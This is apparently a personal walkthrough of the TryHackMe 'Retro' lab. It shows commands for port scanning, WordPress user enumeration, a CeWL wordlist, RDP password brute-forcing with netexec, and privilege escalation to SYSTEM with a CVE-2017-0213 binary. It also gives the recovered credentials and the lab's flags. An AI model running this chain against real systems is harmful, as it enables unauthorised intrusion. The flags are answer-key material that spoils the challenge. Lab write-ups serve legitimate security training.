# CTF: Retro (THM)

**Target IP:** `10.145.154.166` ($target)

## Metadata

- **CTF Name:** Retro
    
- **Platform:** TryHackMe
    
- **Date:** 2026-04-29
    
- **Difficulty:** Hard
    
- **Tools Used:** nmap, feroxbuster, wpscan, cewl, netexec, xfreerdp3
    
- **Key Skills/Tools:** WordPress User Enumeration, Custom Wordlist Generation (CeWL), RDP Exploitation, Windows Privilege Escalation (CVE-2017-0213).
    

## Introduction

This walkthrough documents the exploitation of the **Retro** machine on TryHackMe. The process involves identifying a WordPress installation on a Windows IIS server, enumerating users to find the account `wade`, and generating a targeted wordlist from the site content. After gaining a foothold via RDP, privilege escalation is achieved by exploiting a COM Aggregate Marshaler vulnerability (CVE-2017-0213) to gain SYSTEM privileges.

## Reconnaissance

### 1. Port Scanning

Initial identification of open ports and services using a multi-stage Nmap scan.

**Command:**

```
😎 amuzed@Kali (~/THM/Retro)
$ nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn $target -sV -sC -v -oN nmap_sVsC.txt && sleep 5 && nmap -T5 -Pn $target -v --script vuln -oN nmap_vuln.txt
```

**Key Results:**

- **80/tcp:** open http (Microsoft IIS httpd 10.0)
    
- **3389/tcp:** open ms-wbt-server (Microsoft Terminal Services)
    

### 2. Directory Enumeration

Using `feroxbuster` to identify web directories.

**Command:**

```
😎 amuzed@Kali (~/THM/Retro)
$ feroxbuster --url [http://retro.thm](http://retro.thm) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60 -C 404,403 
```

### 3. WordPress Enumeration

Identifying the CMS and enumerating users.

**Command:**

```
😎 amuzed@Kali (~/THM/Retro)
$ wpscan --url [http://retro.thm/retro](http://retro.thm/retro) -e u
```

- **Result:** User `wade` (and `Wade`) identified.
    

## Foothold

### 1. Custom Wordlist Generation

Generating a targeted wordlist based on the web content.

**Command:**

```
😎 amuzed@Kali (~/THM/Retro)
$ cewl -d 3 -m 7 -w retro.txt http://$target/retro/
```

### 2. Credential Brute-forcing (RDP)

Testing the wordlist against the RDP service.

**Command:**

```
😎 amuzed@Kali (~/THM/Retro)
$ netexec rdp $target -u wade -p retro.txt
```

- **Result:** `RetroWeb\wade:parzival` discovered.
    

### 3. Initial Access (RDP)

While the credentials worked on the WordPress site, the shell exited prematurely. RDP provided a stable session.

**Command:**

```
😎 amuzed@Kali (~/THM/Retro)
$ xfreerdp3 /v:$target /u:wade /p:parzival
```

## Privilege Escalation

### 1. The Rabbit Hole (CVE-2019-1388)

Upon inspecting the machine (WinPEAS and browser history), I found references to `CVE-2019-1388`. I attempted to exploit this; however, it proved to be a rabbit hole as the exploit would not work even with community workarounds.

### 2. Exploiting CVE-2017-0213

I identified that the OS (Windows Server 2016 Standard, Build 14393) was vulnerable to `CVE-2017-0213`. I downloaded a pre-compiled binary to the target.

**Execution:**

```
C:\Users\wade\Downloads> CVE-2017-0213_x64.exe
```

**Gaining SYSTEM:**

The exploit spawned a new shell with elevated privileges:

```
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

## Flags

- **User Flag:** `3b99fbdc6d430bfb51c72c651a261927`
    
- **Root Flag:** `7958b569565d7bd88d10c6f22d1c4063`
